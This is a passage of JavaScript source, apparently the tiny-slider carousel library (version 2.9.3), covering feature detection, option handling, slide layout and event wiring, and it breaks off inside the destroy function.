var tns = function () {
    var win = window,
        raf = win.requestAnimationFrame || win.webkitRequestAnimationFrame || win.mozRequestAnimationFrame || win.msRequestAnimationFrame || function (cb) {
            return setTimeout(cb, 16)
        }, win$1 = window, caf = win$1.cancelAnimationFrame || win$1.mozCancelAnimationFrame || function (id) {
            clearTimeout(id)
        };

    function extend() {
        for (var obj, name, copy, target = arguments[0] || {}, i = 1, length = arguments.length; i < length; i++) if (null !== (obj = arguments[i])) for (name in obj) target !== (copy = obj[name]) && void 0 !== copy && (target[name] = copy);
        return target
    }

    function checkStorageValue(value) {
        return ["true", "false"].indexOf(value) >= 0 ? JSON.parse(value) : value
    }

    function setLocalStorage(storage, key, value, access) {
        if (access) try {
            storage.setItem(key, value)
        } catch (e) {
        }
        return value
    }

    function getBody() {
        var doc = document, body = doc.body;
        return body || ((body = doc.createElement("body")).fake = !0), body
    }

    var docElement = document.documentElement;

    function setFakeBody(body) {
        var docOverflow = "";
        return body.fake && (docOverflow = docElement.style.overflow, body.style.background = "", body.style.overflow = docElement.style.overflow = "hidden", docElement.appendChild(body)), docOverflow
    }

    function resetFakeBody(body, docOverflow) {
        body.fake && (body.remove(), docElement.style.overflow = docOverflow, docElement.offsetHeight)
    }

    function addCSSRule(sheet, selector, rules, index) {
        "insertRule" in sheet ? sheet.insertRule(selector + "{" + rules + "}", index) : sheet.addRule(selector, rules, index)
    }

    function getCssRulesLength(sheet) {
        return ("insertRule" in sheet ? sheet.cssRules : sheet.rules).length
    }

    function forEach(arr, callback, scope) {
        for (var i = 0, l = arr.length; i < l; i++) callback.call(scope, arr[i], i)
    }

    var classListSupport = "classList" in document.createElement("_"),
        hasClass = classListSupport ? function (el, str) {
            return el.classList.contains(str)
        } : function (el, str) {
            return el.className.indexOf(str) >= 0
        }, addClass = classListSupport ? function (el, str) {
            hasClass(el, str) || el.classList.add(str)
        } : function (el, str) {
            hasClass(el, str) || (el.className += " " + str)
        }, removeClass = classListSupport ? function (el, str) {
            hasClass(el, str) && el.classList.remove(str)
        } : function (el, str) {
            hasClass(el, str) && (el.className = el.className.replace(str, ""))
        };

    function hasAttr(el, attr) {
        return el.hasAttribute(attr)
    }

    function getAttr(el, attr) {
        return el.getAttribute(attr)
    }

    function isNodeList(el) {
        return void 0 !== el.item
    }

    function setAttrs(els, attrs) {
        if (els = isNodeList(els) || els instanceof Array ? els : [els], "[object Object]" === Object.prototype.toString.call(attrs)) for (var i = els.length; i--;) for (var key in attrs) els[i].setAttribute(key, attrs[key])
    }

    function removeAttrs(els, attrs) {
        els = isNodeList(els) || els instanceof Array ? els : [els];
        for (var attrLength = (attrs = attrs instanceof Array ? attrs : [attrs]).length, i = els.length; i--;) for (var j = attrLength; j--;) els[i].removeAttribute(attrs[j])
    }

    function arrayFromNodeList(nl) {
        for (var arr = [], i = 0, l = nl.length; i < l; i++) arr.push(nl[i]);
        return arr
    }

    function hideElement(el, forceHide) {
        "none" !== el.style.display && (el.style.display = "none")
    }

    function showElement(el, forceHide) {
        "none" === el.style.display && (el.style.display = "")
    }

    function isVisible(el) {
        return "none" !== window.getComputedStyle(el).display
    }

    function whichProperty(props) {
        if ("string" == typeof props) {
            var arr = [props], Props = props.charAt(0).toUpperCase() + props.substr(1);
            ["Webkit", "Moz", "ms", "O"].forEach((function (prefix) {
                "ms" === prefix && "transform" !== props || arr.push(prefix + Props)
            })), props = arr
        }
        for (var el = document.createElement("fakeelement"), i = (props.length, 0); i < props.length; i++) {
            var prop = props[i];
            if (void 0 !== el.style[prop]) return prop
        }
        return !1
    }

    function getEndProperty(propIn, propOut) {
        var endProp = !1;
        return /^Webkit/.test(propIn) ? endProp = "webkit" + propOut + "End" : /^O/.test(propIn) ? endProp = "o" + propOut + "End" : propIn && (endProp = propOut.toLowerCase() + "end"), endProp
    }

    var supportsPassive = !1;
    try {
        var opts = Object.defineProperty({}, "passive", {
            get: function () {
                supportsPassive = !0
            }
        });
        window.addEventListener("test", null, opts)
    } catch (e) {
    }
    var passiveOption = !!supportsPassive && {passive: !0};

    function addEvents(el, obj, preventScrolling) {
        for (var prop in obj) {
            var option = ["touchstart", "touchmove"].indexOf(prop) >= 0 && !preventScrolling && passiveOption;
            el.addEventListener(prop, obj[prop], option)
        }
    }

    function removeEvents(el, obj) {
        for (var prop in obj) {
            var option = ["touchstart", "touchmove"].indexOf(prop) >= 0 && passiveOption;
            el.removeEventListener(prop, obj[prop], option)
        }
    }

    function Events() {
        return {
            topics: {}, on: function (eventName, fn) {
                this.topics[eventName] = this.topics[eventName] || [], this.topics[eventName].push(fn)
            }, off: function (eventName, fn) {
                if (this.topics[eventName]) for (var i = 0; i < this.topics[eventName].length; i++) if (this.topics[eventName][i] === fn) {
                    this.topics[eventName].splice(i, 1);
                    break
                }
            }, emit: function (eventName, data) {
                data.type = eventName, this.topics[eventName] && this.topics[eventName].forEach((function (fn) {
                    fn(data, eventName)
                }))
            }
        }
    }

    Object.keys || (Object.keys = function (object) {
        var keys = [];
        for (var name in object) Object.prototype.hasOwnProperty.call(object, name) && keys.push(name);
        return keys
    }), "remove" in Element.prototype || (Element.prototype.remove = function () {
        this.parentNode && this.parentNode.removeChild(this)
    });
    var tns = function (options) {
        options = extend({
            container: ".slider",
            mode: "carousel",
            axis: "horizontal",
            items: 1,
            gutter: 0,
            edgePadding: 0,
            fixedWidth: !1,
            autoWidth: !1,
            viewportMax: !1,
            slideBy: 1,
            center: !1,
            controls: !0,
            controlsPosition: "top",
            controlsText: ["prev", "next"],
            controlsContainer: !1,
            prevButton: !1,
            nextButton: !1,
            nav: !0,
            navPosition: "top",
            navContainer: !1,
            navAsThumbnails: !1,
            arrowKeys: !1,
            speed: 300,
            autoplay: !1,
            autoplayPosition: "top",
            autoplayTimeout: 5e3,
            autoplayDirection: "forward",
            autoplayText: ["start", "stop"],
            autoplayHoverPause: !1,
            autoplayButton: !1,
            autoplayButtonOutput: !0,
            autoplayResetOnVisibility: !0,
            animateIn: "tns-fadeIn",
            animateOut: "tns-fadeOut",
            animateNormal: "tns-normal",
            animateDelay: !1,
            loop: !0,
            rewind: !1,
            autoHeight: !1,
            responsive: !1,
            lazyload: !1,
            lazyloadSelector: ".tns-lazy-img",
            touch: !0,
            mouseDrag: !1,
            swipeAngle: 15,
            nested: !1,
            preventActionWhenRunning: !1,
            preventScrollOnTouch: !1,
            freezable: !0,
            onInit: !1,
            useLocalStorage: !0,
            nonce: !1
        }, options || {});
        var doc = document, win = window, KEYS = {ENTER: 13, SPACE: 32, LEFT: 37, RIGHT: 39}, tnsStorage = {},
            localStorageAccess = options.useLocalStorage;
        if (localStorageAccess) {
            var browserInfo = navigator.userAgent, uid = new Date;
            try {
                (tnsStorage = win.localStorage) ? (tnsStorage.setItem(uid, uid), localStorageAccess = tnsStorage.getItem(uid) == uid, tnsStorage.removeItem(uid)) : localStorageAccess = !1, localStorageAccess || (tnsStorage = {})
            } catch (e) {
                localStorageAccess = !1
            }
            localStorageAccess && (tnsStorage.tnsApp && tnsStorage.tnsApp !== browserInfo && ["tC", "tPL", "tMQ", "tTf", "t3D", "tTDu", "tTDe", "tADu", "tADe", "tTE", "tAE"].forEach((function (item) {
                tnsStorage.removeItem(item)
            })), localStorage.tnsApp = browserInfo)
        }
        var CALC = tnsStorage.tC ? checkStorageValue(tnsStorage.tC) : setLocalStorage(tnsStorage, "tC", function calc() {
                var doc = document, body = getBody(), docOverflow = setFakeBody(body), div = doc.createElement("div"),
                    result = !1;
                body.appendChild(div);
                try {
                    for (var val, str = "(10px * 10)", vals = ["calc" + str, "-moz-calc" + str, "-webkit-calc" + str], i = 0; i < 3; i++) if (val = vals[i], div.style.width = val, 100 === div.offsetWidth) {
                        result = val.replace(str, "");
                        break
                    }
                } catch (e) {
                }
                return body.fake ? resetFakeBody(body, docOverflow) : div.remove(), result
            }(), localStorageAccess),
            PERCENTAGELAYOUT = tnsStorage.tPL ? checkStorageValue(tnsStorage.tPL) : setLocalStorage(tnsStorage, "tPL", function percentageLayout() {
                var supported, doc = document, body = getBody(), docOverflow = setFakeBody(body),
                    wrapper = doc.createElement("div"), outer = doc.createElement("div"), str = "";
                wrapper.className = "tns-t-subp2", outer.className = "tns-t-ct";
                for (var i = 0; i < 70; i++) str += "<div></div>";
                return outer.innerHTML = str, wrapper.appendChild(outer), body.appendChild(wrapper), supported = Math.abs(wrapper.getBoundingClientRect().left - outer.children[67].getBoundingClientRect().left) < 2, body.fake ? resetFakeBody(body, docOverflow) : wrapper.remove(), supported
            }(), localStorageAccess),
            CSSMQ = tnsStorage.tMQ ? checkStorageValue(tnsStorage.tMQ) : setLocalStorage(tnsStorage, "tMQ", function mediaquerySupport() {
                if (window.matchMedia || window.msMatchMedia) return !0;
                var position, doc = document, body = getBody(), docOverflow = setFakeBody(body),
                    div = doc.createElement("div"), style = doc.createElement("style"),
                    rule = "@media all and (min-width:1px){.tns-mq-test{position:absolute}}";
                return style.type = "text/css", div.className = "tns-mq-test", body.appendChild(style), body.appendChild(div), style.styleSheet ? style.styleSheet.cssText = rule : style.appendChild(doc.createTextNode(rule)), position = window.getComputedStyle ? window.getComputedStyle(div).position : div.currentStyle.position, body.fake ? resetFakeBody(body, docOverflow) : div.remove(), "absolute" === position
            }(), localStorageAccess),
            TRANSFORM = tnsStorage.tTf ? checkStorageValue(tnsStorage.tTf) : setLocalStorage(tnsStorage, "tTf", whichProperty("transform"), localStorageAccess),
            HAS3DTRANSFORMS = tnsStorage.t3D ? checkStorageValue(tnsStorage.t3D) : setLocalStorage(tnsStorage, "t3D", function has3DTransforms(tf) {
                if (!tf) return !1;
                if (!window.getComputedStyle) return !1;
                var has3d, doc = document, body = getBody(), docOverflow = setFakeBody(body),
                    el = doc.createElement("p"), cssTF = tf.length > 9 ? "-" + tf.slice(0, -9).toLowerCase() + "-" : "";
                return cssTF += "transform", body.insertBefore(el, null), el.style[tf] = "translate3d(1px,1px,1px)", has3d = window.getComputedStyle(el).getPropertyValue(cssTF), body.fake ? resetFakeBody(body, docOverflow) : el.remove(), void 0 !== has3d && has3d.length > 0 && "none" !== has3d
            }(TRANSFORM), localStorageAccess),
            TRANSITIONDURATION = tnsStorage.tTDu ? checkStorageValue(tnsStorage.tTDu) : setLocalStorage(tnsStorage, "tTDu", whichProperty("transitionDuration"), localStorageAccess),
            TRANSITIONDELAY = tnsStorage.tTDe ? checkStorageValue(tnsStorage.tTDe) : setLocalStorage(tnsStorage, "tTDe", whichProperty("transitionDelay"), localStorageAccess),
            ANIMATIONDURATION = tnsStorage.tADu ? checkStorageValue(tnsStorage.tADu) : setLocalStorage(tnsStorage, "tADu", whichProperty("animationDuration"), localStorageAccess),
            ANIMATIONDELAY = tnsStorage.tADe ? checkStorageValue(tnsStorage.tADe) : setLocalStorage(tnsStorage, "tADe", whichProperty("animationDelay"), localStorageAccess),
            TRANSITIONEND = tnsStorage.tTE ? checkStorageValue(tnsStorage.tTE) : setLocalStorage(tnsStorage, "tTE", getEndProperty(TRANSITIONDURATION, "Transition"), localStorageAccess),
            ANIMATIONEND = tnsStorage.tAE ? checkStorageValue(tnsStorage.tAE) : setLocalStorage(tnsStorage, "tAE", getEndProperty(ANIMATIONDURATION, "Animation"), localStorageAccess),
            supportConsoleWarn = win.console && "function" == typeof win.console.warn,
            tnsList = ["container", "controlsContainer", "prevButton", "nextButton", "navContainer", "autoplayButton"],
            optionsElements = {};
        if (tnsList.forEach((function (item) {
            if ("string" == typeof options[item]) {
                var str = options[item], el = doc.querySelector(str);
                if (optionsElements[item] = str, !el || !el.nodeName) return void (supportConsoleWarn && console.warn("Can't find", options[item]));
                options[item] = el
            }
        })), !(options.container.children.length < 1)) {
            var responsive = options.responsive, nested = options.nested, carousel = "carousel" === options.mode;
            if (responsive) {
                0 in responsive && (options = extend(options, responsive[0]), delete responsive[0]);
                var responsiveTem = {};
                for (var key in responsive) {
                    var val = responsive[key];
                    val = "number" == typeof val ? {items: val} : val, responsiveTem[key] = val
                }
                responsive = responsiveTem, responsiveTem = null
            }
            if (carousel || function updateOptions(obj) {
                for (var key in obj) carousel || ("slideBy" === key && (obj[key] = "page"), "edgePadding" === key && (obj[key] = !1), "autoHeight" === key && (obj[key] = !1)), "responsive" === key && updateOptions(obj[key])
            }(options), !carousel) {
                options.axis = "horizontal", options.slideBy = "page", options.edgePadding = !1;
                var animateIn = options.animateIn, animateOut = options.animateOut, animateDelay = options.animateDelay,
                    animateNormal = options.animateNormal
            }
            var middleWrapper, breakpointZone, horizontal = "horizontal" === options.axis,
                outerWrapper = doc.createElement("div"), innerWrapper = doc.createElement("div"),
                container = options.container, containerParent = container.parentNode,
                containerHTML = container.outerHTML, slideItems = container.children, slideCount = slideItems.length,
                windowWidth = getWindowWidth(), isOn = !1;
            responsive && setBreakpointZone(), carousel && (container.className += " tns-vpfix");
            var slidePositions, imgsComplete, liveregionCurrent, autoWidth = options.autoWidth,
                fixedWidth = getOption("fixedWidth"), edgePadding = getOption("edgePadding"),
                gutter = getOption("gutter"), viewport = getViewportWidth(), center = getOption("center"),
                items = autoWidth ? 1 : Math.floor(getOption("items")), slideBy = getOption("slideBy"),
                viewportMax = options.viewportMax || options.fixedWidthViewportWidth,
                arrowKeys = getOption("arrowKeys"), speed = getOption("speed"), rewind = options.rewind,
                loop = !rewind && options.loop, autoHeight = getOption("autoHeight"), controls = getOption("controls"),
                controlsText = getOption("controlsText"), nav = getOption("nav"), touch = getOption("touch"),
                mouseDrag = getOption("mouseDrag"), autoplay = getOption("autoplay"),
                autoplayTimeout = getOption("autoplayTimeout"), autoplayText = getOption("autoplayText"),
                autoplayHoverPause = getOption("autoplayHoverPause"),
                autoplayResetOnVisibility = getOption("autoplayResetOnVisibility"),
                sheet = function createStyleSheet(media, nonce) {
                    var style = document.createElement("style");
                    return media && style.setAttribute("media", media), nonce && style.setAttribute("nonce", nonce), document.querySelector("head").appendChild(style), style.sheet ? style.sheet : style.styleSheet
                }(null, getOption("nonce")), lazyload = options.lazyload, lazyloadSelector = options.lazyloadSelector,
                slideItemsOut = [], cloneCount = loop ? function getCloneCountForLoop() {
                    var itemsMax = function getItemsMax() {
                        if (autoWidth || fixedWidth && !viewportMax) return slideCount - 1;
                        var str = fixedWidth ? "fixedWidth" : "items", arr = [];
                        if ((fixedWidth || options[str] < slideCount) && arr.push(options[str]), responsive) for (var bp in responsive) {
                            var tem = responsive[bp][str];
                            tem && (fixedWidth || tem < slideCount) && arr.push(tem)
                        }
                        return arr.length || arr.push(0), Math.ceil(fixedWidth ? viewportMax / Math.min.apply(null, arr) : Math.max.apply(null, arr))
                    }(), result = carousel ? Math.ceil((5 * itemsMax - slideCount) / 2) : 4 * itemsMax - slideCount;
                    return result = Math.max(itemsMax, result), hasOption("edgePadding") ? result + 1 : result
                }() : 0, slideCountNew = carousel ? slideCount + 2 * cloneCount : slideCount + cloneCount,
                hasRightDeadZone = !(!fixedWidth && !autoWidth || loop),
                rightBoundary = fixedWidth ? getRightBoundary() : null, updateIndexBeforeTransform = !carousel || !loop,
                transformAttr = horizontal ? "left" : "top", transformPrefix = "", transformPostfix = "",
                getIndexMax = fixedWidth ? function () {
                    return center && !loop ? slideCount - 1 : Math.ceil(-rightBoundary / (fixedWidth + gutter))
                } : autoWidth ? function () {
                    for (var i = 0; i < slideCountNew; i++) if (slidePositions[i] >= -rightBoundary) return i
                } : function () {
                    return center && carousel && !loop ? slideCount - 1 : loop || carousel ? Math.max(0, slideCountNew - Math.ceil(items)) : slideCountNew - 1
                }, index = getStartIndex(getOption("startIndex")), indexCached = index,
                indexMin = (getCurrentSlide(), 0), indexMax = autoWidth ? null : getIndexMax(),
                preventActionWhenRunning = options.preventActionWhenRunning, swipeAngle = options.swipeAngle,
                moveDirectionExpected = !swipeAngle || "?", running = !1, onInit = options.onInit, events = new Events,
                newContainerClasses = " tns-slider tns-" + options.mode,
                slideId = container.id || function getSlideId() {
                    var id = window.tnsId;
                    return window.tnsId = id ? id + 1 : 1, "tns" + window.tnsId
                }(), disable = getOption("disable"), disabled = !1, freezable = options.freezable,
                freeze = !(!freezable || autoWidth) && getFreeze(), frozen = !1, controlsEvents = {
                    click: onControlsClick, keydown: function onControlsKeydown(e) {
                        e = getEvent(e);
                        var keyIndex = [KEYS.LEFT, KEYS.RIGHT].indexOf(e.keyCode);
                        keyIndex >= 0 && (0 === keyIndex ? prevButton.disabled || onControlsClick(e, -1) : nextButton.disabled || onControlsClick(e, 1))
                    }
                }, navEvents = {
                    click: function onNavClick(e) {
                        if (running) {
                            if (preventActionWhenRunning) return;
                            onTransitionEnd()
                        }
                        var target = getTarget(e = getEvent(e));
                        for (; target !== navContainer && !hasAttr(target, "data-nav");) target = target.parentNode;
                        if (hasAttr(target, "data-nav")) {
                            var navIndex = navClicked = Number(getAttr(target, "data-nav")),
                                targetIndexBase = fixedWidth || autoWidth ? navIndex * slideCount / pages : navIndex * items;
                            goTo(navAsThumbnails ? navIndex : Math.min(Math.ceil(targetIndexBase), slideCount - 1), e), navCurrentIndex === navIndex && (animating && stopAutoplay(), navClicked = -1)
                        }
                    }, keydown: function onNavKeydown(e) {
                        e = getEvent(e);
                        var curElement = doc.activeElement;
                        if (!hasAttr(curElement, "data-nav")) return;
                        var keyIndex = [KEYS.LEFT, KEYS.RIGHT, KEYS.ENTER, KEYS.SPACE].indexOf(e.keyCode),
                            navIndex = Number(getAttr(curElement, "data-nav"));
                        keyIndex >= 0 && (0 === keyIndex ? navIndex > 0 && setFocus(navItems[navIndex - 1]) : 1 === keyIndex ? navIndex < pages - 1 && setFocus(navItems[navIndex + 1]) : (navClicked = navIndex, goTo(navIndex, e)))
                    }
                }, hoverEvents = {
                    mouseover: function mouseoverPause() {
                        animating && (stopAutoplayTimer(), autoplayHoverPaused = !0)
                    }, mouseout: function mouseoutRestart() {
                        autoplayHoverPaused && (setAutoplayTimer(), autoplayHoverPaused = !1)
                    }
                }, visibilityEvent = {
                    visibilitychange: function onVisibilityChange() {
                        doc.hidden ? animating && (stopAutoplayTimer(), autoplayVisibilityPaused = !0) : autoplayVisibilityPaused && (setAutoplayTimer(), autoplayVisibilityPaused = !1)
                    }
                }, docmentKeydownEvent = {
                    keydown: function onDocumentKeydown(e) {
                        e = getEvent(e);
                        var keyIndex = [KEYS.LEFT, KEYS.RIGHT].indexOf(e.keyCode);
                        keyIndex >= 0 && onControlsClick(e, 0 === keyIndex ? -1 : 1)
                    }
                }, touchEvents = {touchstart: onPanStart, touchmove: onPanMove, touchend: onPanEnd, touchcancel: onPanEnd},
                dragEvents = {mousedown: onPanStart, mousemove: onPanMove, mouseup: onPanEnd, mouseleave: onPanEnd},
                hasControls = hasOption("controls"), hasNav = hasOption("nav"),
                navAsThumbnails = !!autoWidth || options.navAsThumbnails, hasAutoplay = hasOption("autoplay"),
                hasTouch = hasOption("touch"), hasMouseDrag = hasOption("mouseDrag"),
                slideActiveClass = "tns-slide-active", imgCompleteClass = "tns-complete", imgEvents = {
                    load: function onImgLoaded(e) {
                        imgLoaded(getTarget(e))
                    }, error: function onImgFailed(e) {
                        !function imgFailed(img) {
                            addClass(img, "failed"), imgCompleted(img)
                        }(getTarget(e))
                    }
                }, preventScroll = "force" === options.preventScrollOnTouch;
            if (hasControls) var prevIsButton, nextIsButton, controlsContainer = options.controlsContainer,
                controlsContainerHTML = options.controlsContainer ? options.controlsContainer.outerHTML : "",
                prevButton = options.prevButton, nextButton = options.nextButton,
                prevButtonHTML = options.prevButton ? options.prevButton.outerHTML : "",
                nextButtonHTML = options.nextButton ? options.nextButton.outerHTML : "";
            if (hasNav) var navItems, navContainer = options.navContainer,
                navContainerHTML = options.navContainer ? options.navContainer.outerHTML : "",
                pages = autoWidth ? slideCount : getPages(), pagesCached = 0, navClicked = -1,
                navCurrentIndex = getCurrentNavIndex(), navCurrentIndexCached = navCurrentIndex,
                navActiveClass = "tns-nav-active", navStr = "Carousel Page ", navStrCurrent = " (Current Slide)";
            if (hasAutoplay) var autoplayTimer, animating, autoplayHoverPaused, autoplayUserPaused,
                autoplayVisibilityPaused, autoplayDirection = "forward" === options.autoplayDirection ? 1 : -1,
                autoplayButton = options.autoplayButton,
                autoplayButtonHTML = options.autoplayButton ? options.autoplayButton.outerHTML : "",
                autoplayHtmlStrings = ["<span class='tns-visually-hidden'>", " animation</span>"];
            if (hasTouch || hasMouseDrag) var translateInit, rafIndex, initPosition = {}, lastPosition = {},
                panStart = !1, getDist = horizontal ? function (a, b) {
                    return a.x - b.x
                } : function (a, b) {
                    return a.y - b.y
                };
            autoWidth || resetVariblesWhenDisable(disable || freeze), TRANSFORM && (transformAttr = TRANSFORM, transformPrefix = "translate", HAS3DTRANSFORMS ? (transformPrefix += horizontal ? "3d(" : "3d(0px, ", transformPostfix = horizontal ? ", 0px, 0px)" : ", 0px)") : (transformPrefix += horizontal ? "X(" : "Y(", transformPostfix = ")")), carousel && (container.className = container.className.replace("tns-vpfix", "")), function initStructure() {
                hasOption("gutter");
                outerWrapper.className = "tns-outer", innerWrapper.className = "tns-inner", outerWrapper.id = slideId + "-ow", innerWrapper.id = slideId + "-iw", "" === container.id && (container.id = slideId);
                newContainerClasses += PERCENTAGELAYOUT || autoWidth ? " tns-subpixel" : " tns-no-subpixel", newContainerClasses += CALC ? " tns-calc" : " tns-no-calc", autoWidth && (newContainerClasses += " tns-autowidth");
                newContainerClasses += " tns-" + options.axis, container.className += newContainerClasses, carousel ? ((middleWrapper = doc.createElement("div")).id = slideId + "-mw", middleWrapper.className = "tns-ovh", outerWrapper.appendChild(middleWrapper), middleWrapper.appendChild(innerWrapper)) : outerWrapper.appendChild(innerWrapper);
                if (autoHeight) {
                    (middleWrapper || innerWrapper).className += " tns-ah"
                }
                if (containerParent.insertBefore(outerWrapper, container), innerWrapper.appendChild(container), forEach(slideItems, (function (item, i) {
                    addClass(item, "tns-item"), item.id || (item.id = slideId + "-item" + i), !carousel && animateNormal && addClass(item, animateNormal), setAttrs(item, {
                        "aria-hidden": "true",
                        tabindex: "-1"
                    })
                })), cloneCount) {
                    for (var fragmentBefore = doc.createDocumentFragment(), fragmentAfter = doc.createDocumentFragment(), j = cloneCount; j--;) {
                        var num = j % slideCount, cloneFirst = slideItems[num].cloneNode(!0);
                        if (addClass(cloneFirst, "tns-slide-cloned"), removeAttrs(cloneFirst, "id"), fragmentAfter.insertBefore(cloneFirst, fragmentAfter.firstChild), carousel) {
                            var cloneLast = slideItems[slideCount - 1 - num].cloneNode(!0);
                            addClass(cloneLast, "tns-slide-cloned"), removeAttrs(cloneLast, "id"), fragmentBefore.appendChild(cloneLast)
                        }
                    }
                    container.insertBefore(fragmentBefore, container.firstChild), container.appendChild(fragmentAfter), slideItems = container.children
                }
            }(), function initSheet() {
                if (!carousel) for (var i = index, l = index + Math.min(slideCount, items); i < l; i++) {
                    var item = slideItems[i];
                    item.style.left = 100 * (i - index) / items + "%", addClass(item, animateIn), removeClass(item, animateNormal)
                }
                horizontal && (PERCENTAGELAYOUT || autoWidth ? (addCSSRule(sheet, "#" + slideId + " > .tns-item", "font-size:" + win.getComputedStyle(slideItems[0]).fontSize + ";", getCssRulesLength(sheet)), addCSSRule(sheet, "#" + slideId, "font-size:0;", getCssRulesLength(sheet))) : carousel && forEach(slideItems, (function (slide, i) {
                    slide.style.marginLeft = function getSlideMarginLeft(i) {
                        return CALC ? CALC + "(" + 100 * i + "% / " + slideCountNew + ")" : 100 * i / slideCountNew + "%"
                    }(i)
                })));
                if (CSSMQ) {
                    if (TRANSITIONDURATION) {
                        var str = middleWrapper && options.autoHeight ? getTransitionDurationStyle(options.speed) : "";
                        addCSSRule(sheet, "#" + slideId + "-mw", str, getCssRulesLength(sheet))
                    }
                    str = getInnerWrapperStyles(options.edgePadding, options.gutter, options.fixedWidth, options.speed, options.autoHeight), addCSSRule(sheet, "#" + slideId + "-iw", str, getCssRulesLength(sheet)), carousel && (str = horizontal && !autoWidth ? "width:" + getContainerWidth(options.fixedWidth, options.gutter, options.items) + ";" : "", TRANSITIONDURATION && (str += getTransitionDurationStyle(speed)), addCSSRule(sheet, "#" + slideId, str, getCssRulesLength(sheet))), str = horizontal && !autoWidth ? getSlideWidthStyle(options.fixedWidth, options.gutter, options.items) : "", options.gutter && (str += getSlideGutterStyle(options.gutter)), carousel || (TRANSITIONDURATION && (str += getTransitionDurationStyle(speed)), ANIMATIONDURATION && (str += getAnimationDurationStyle(speed))), str && addCSSRule(sheet, "#" + slideId + " > .tns-item", str, getCssRulesLength(sheet))
                } else {
                    !function update_carousel_transition_duration() {
                        carousel && autoHeight && (middleWrapper.style[TRANSITIONDURATION] = speed / 1e3 + "s")
                    }(), innerWrapper.style.cssText = getInnerWrapperStyles(edgePadding, gutter, fixedWidth, autoHeight), carousel && horizontal && !autoWidth && (container.style.width = getContainerWidth(fixedWidth, gutter, items));
                    str = horizontal && !autoWidth ? getSlideWidthStyle(fixedWidth, gutter, items) : "";
                    gutter && (str += getSlideGutterStyle(gutter)), str && addCSSRule(sheet, "#" + slideId + " > .tns-item", str, getCssRulesLength(sheet))
                }
                if (responsive && CSSMQ) for (var bp in responsive) {
                    bp = parseInt(bp);
                    var opts = responsive[bp], middleWrapperStr = (str = "", ""), innerWrapperStr = "",
                        containerStr = "", slideStr = "", itemsBP = autoWidth ? null : getOption("items", bp),
                        fixedWidthBP = getOption("fixedWidth", bp), speedBP = getOption("speed", bp),
                        edgePaddingBP = getOption("edgePadding", bp), autoHeightBP = getOption("autoHeight", bp),
                        gutterBP = getOption("gutter", bp);
                    TRANSITIONDURATION && middleWrapper && getOption("autoHeight", bp) && "speed" in opts && (middleWrapperStr = "#" + slideId + "-mw{" + getTransitionDurationStyle(speedBP) + "}"), ("edgePadding" in opts || "gutter" in opts) && (innerWrapperStr = "#" + slideId + "-iw{" + getInnerWrapperStyles(edgePaddingBP, gutterBP, fixedWidthBP, speedBP, autoHeightBP) + "}"), carousel && horizontal && !autoWidth && ("fixedWidth" in opts || "items" in opts || fixedWidth && "gutter" in opts) && (containerStr = "width:" + getContainerWidth(fixedWidthBP, gutterBP, itemsBP) + ";"), TRANSITIONDURATION && "speed" in opts && (containerStr += getTransitionDurationStyle(speedBP)), containerStr && (containerStr = "#" + slideId + "{" + containerStr + "}"), ("fixedWidth" in opts || fixedWidth && "gutter" in opts || !carousel && "items" in opts) && (slideStr += getSlideWidthStyle(fixedWidthBP, gutterBP, itemsBP)), "gutter" in opts && (slideStr += getSlideGutterStyle(gutterBP)), !carousel && "speed" in opts && (TRANSITIONDURATION && (slideStr += getTransitionDurationStyle(speedBP)), ANIMATIONDURATION && (slideStr += getAnimationDurationStyle(speedBP))), slideStr && (slideStr = "#" + slideId + " > .tns-item{" + slideStr + "}"), (str = middleWrapperStr + innerWrapperStr + containerStr + slideStr) && sheet.insertRule("@media (min-width: " + bp / 16 + "em) {" + str + "}", sheet.cssRules.length)
                }
            }(), initSliderTransform();
            var updateIndex = loop ? carousel ? function () {
                var leftEdge = indexMin, rightEdge = indexMax;
                leftEdge += slideBy, rightEdge -= slideBy, edgePadding ? (leftEdge += 1, rightEdge -= 1) : fixedWidth && (viewport + gutter) % (fixedWidth + gutter) && (rightEdge -= 1), cloneCount && (index > rightEdge ? index -= slideCount : index < leftEdge && (index += slideCount))
            } : function () {
                if (index > indexMax) for (; index >= indexMin + slideCount;) index -= slideCount; else if (index < indexMin) for (; index <= indexMax - slideCount;) index += slideCount
            } : function () {
                index = Math.max(indexMin, Math.min(indexMax, index))
            }, transformCore = carousel ? function () {
                resetDuration(container, ""), TRANSITIONDURATION || !speed ? (doContainerTransform(), speed && isVisible(container) || onTransitionEnd()) : function jsTransform(element, attr, prefix, postfix, to, duration, callback) {
                    var tick = Math.min(duration, 10), unit = to.indexOf("%") >= 0 ? "%" : "px",
                        from = (to = to.replace(unit, ""), Number(element.style[attr].replace(prefix, "").replace(postfix, "").replace(unit, ""))),
                        positionTick = (to - from) / duration * tick;
                    setTimeout((function moveElement() {
                        duration -= tick, from += positionTick, element.style[attr] = prefix + from + unit + postfix, duration > 0 ? setTimeout(moveElement, tick) : callback()
                    }), tick)
                }(container, transformAttr, transformPrefix, transformPostfix, getContainerTransformValue(), speed, onTransitionEnd), horizontal || updateContentWrapperHeight()
            } : function () {
                slideItemsOut = [];
                var eve = {};
                eve[TRANSITIONEND] = eve[ANIMATIONEND] = onTransitionEnd, removeEvents(slideItems[indexCached], eve), addEvents(slideItems[index], eve), animateSlide(indexCached, animateIn, animateOut, !0), animateSlide(index, animateNormal, animateIn), TRANSITIONEND && ANIMATIONEND && speed && isVisible(container) || onTransitionEnd()
            };
            return {
                version: "2.9.3",
                getInfo: info,
                events: events,
                goTo: goTo,
                play: function play() {
                    autoplay && !animating && (startAutoplay(), autoplayUserPaused = !1)
                },
                pause: function pause() {
                    animating && (stopAutoplay(), autoplayUserPaused = !0)
                },
                isOn: isOn,
                updateSliderHeight: updateInnerWrapperHeight,
                refresh: initSliderTransform,
                destroy: function destroy() {
                    if (sheet.disabled = !0, sheet.ownerNode && sheet.ownerNode.remove(), removeEvents(win, {resize: onResize}), arrowKeys && removeEvents(doc, docmentKeydownEvent), controlsContainer && removeEvents(controlsContainer, controlsEvents), navContainer && removeEvents(navContainer, navEvents), removeEvents(container, hoverEvents), removeEvents(container, visibilityEvent), autoplayButton && removeEvents(autoplayButton, {click: toggleAutoplay}), autoplay && clearInterval(autoplayTimer), carousel && TRANSITIONEND) {
                        var eve = {};
                        eve[TRANSITIONEND] = onTransitionEnd, removeEvents(container, eve)
                    }
                    touch && removeEvents(container, touchEvents), mouseDrag && removeEvents(container, dragEvents);
                    var htmlList = [containerHTML, controlsContainerHTML, prevButtonHTML, nextButtonHTML, navContainerHTML, autoplayButtonHTML];
